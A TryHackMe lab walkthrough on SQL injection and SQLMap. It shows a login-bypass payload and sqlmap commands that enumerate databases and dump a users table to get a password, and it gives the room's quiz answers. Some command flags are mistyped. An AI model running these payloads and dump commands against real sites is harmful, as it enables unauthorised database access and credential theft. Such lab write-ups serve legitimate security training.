# SQLMap: the Basics Tryhackme Walkthrough 

Room URL:


---
## Task 1: Introduction

Let’s talk about one of the sneakiest tricks in the hacker’s toolkit: **SQL Injection**! 

Imagine a website as a polite waiter taking orders from users and delivering them to a database "kitchen" in the back. When you search for something or log in, you’re basically telling the waiter, “Hey, go grab this info from the kitchen.” And the waiter (website) sends your request to the database in SQL, the language it understands.

Now, here’s where things get spicy: SQL Injection is like whispering extra instructions to the waiter to mess with the kitchen. Instead of just ordering a burger, you slyly add, “And also sneak me the manager’s password list.” The unassuming waiter takes it back to the kitchen without question, leading to all sorts of mayhem!

But how is this even possible? Databases work with a system that uses SQL, like MySQL or PostgreSQL, to manage all that data. When websites don’t secure their database connections, attackers can input special SQL commands to trick the website into coughing up sensitive info. This is why SQL injection remains one of the top vulnerabilities in cybersecurity.

So, buckle up, because in this session, you’ll dive deep into SQL Injection basics, learn how it’s done, and even try it out yourself in a hands-on challenge! Who knew hacking could be this educational?

**Question: Which language builds the interaction between a website and its database?**

**Answer:** sql

---

## Task 2: SQL Injection Vulnerability

Imagine you’re logging into a website, trying to get through a login page with your trusty username "John" and secret password "Un@detectable444." Typically, the website sends a query to the database, which looks a bit like this:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks if you exist and whether that password matches. If yes, you’re in! But hackers have a trick up their sleeve called **SQL Injection** that lets them twist this query into something that works for them.

Let’s say this login page is sloppy with security and doesn’t clean up user input properly. An attacker could type something like:

**Username:** John  
**Password:** abc' OR 1=1;-- -

Now the query becomes:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

The password part now reads:

- Password = 'abc' (no match)
- OR 1=1 (which is always true!)

So the database just shrugs and lets them in. The `--` tells the database to ignore the rest, bypassing the real password check.

**Lesson Learned:** Clean up your input fields, or you might just hand out the keys to the kingdom, courtesy of SQL Injection!

**Question: Which boolean operator checks if at least one side of the operator is true for the condition to be true?**

**Answer:** or

**Question: Is 1=1 in an SQL query always true? (YEA/NAY)**

**Answer:** Yea

---

## Task 3: Automated SQL Injection Tool

Feeling like hacking databases is too much typing? Enter **SQLMap**, the database burglar’s best friend.

Forget trying to break in manually — SQLMap does the hard work for you. It’s like a tour guide for database heists, handling everything from picking the lock to finding the treasure.

**SQLMap** is a command-line tool that turns you into a database wizard, as long as you have permission (seriously). Start by launching it in your Linux terminal, and if you’re feeling overwhelmed, try `--wizard` mode. Think of it as SQLMap holding your hand.

Want to test a URL for weakness? Just feed it a target URL, like:

```
sqlmap -u http://sqlmaptesting.thm/search?cat=1
```

SQLMap will dig in. If it finds a weak point, it’ll reveal the details: error-based, time-based, UNION query, etc.

Once you’ve confirmed a vulnerable URL:

- Use `--dbs` to list the databases
- Use `-D` to pick one
- Use `--tables` to browse inside
- Use `--dump` to get all the records

In a few commands, you’re a digital Indiana Jones uncovering the secrets of SQL!

**Question: Which flag in the SQLMap tool is used to extract all the databases available?**

**Answer:** --dbs

**Question: What would be the full command of SQLMap for extracting all tables from the “members” database?**  
**(Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)**

**Answer:**
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

---
# TASK 4: Practical Exercise

### Extract the Full GET Request URL:
To view GET parameters, right-click on the page and select “Inspect.”

Go to the Network tab, enter dummy credentials (e.g., email=test and password=test), and hit login.

Locate the GET request; it will look like this:

`http://MACHINE_IP/ai/includes/user_login?email=test&password=test`

Copy this URL, as it includes the GET parameters.

### SQLMap Command Setup:
In the terminal, use the SQLMap tool with this command (substitute MACHINE_IP with the IP address displayed in your AttackBox):

`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' - level=5`

Wrapping the URL in single quotes (‘ ‘) avoids issues with special characters.

### Answering SQLMap Prompts:
When SQLMap asks questions, respond as follows:

- Skip test payloads for other DBMSes: Enter `y`.
- Include all MySQL-specific tests: Enter `y`.
- Try random integer values for ‘–union-char’: Enter `y`.
- Keep testing other parameters if email is vulnerable: Enter `n`.

### SQLMap Results:
After running, SQLMap should identify SQL injection vulnerabilities in the email parameter.

**Question 1: How many databases are available in this web application?**

`sqlmap -u “http://<target-ip>/ai/includes/user_login?email=test&password=test” --dbs -level=5`

**Answer:** 6

**Question 2 : What is the name of the table available in the “ai” database?**

`sqlmap -u “http://<target-ip>/ai/includes/user_login?email=test&password=test” -D ai --tables`

**Answer:** Users

**Question 3 : What is the password of the email test@chatai.com?**

from the ai database dump the Users table

`sqlmap -u "http://<target-ip>/ai/includes/user_login?email=test&password=test" -D ai -T user --dump -level=5`

**Answer:** 12345678
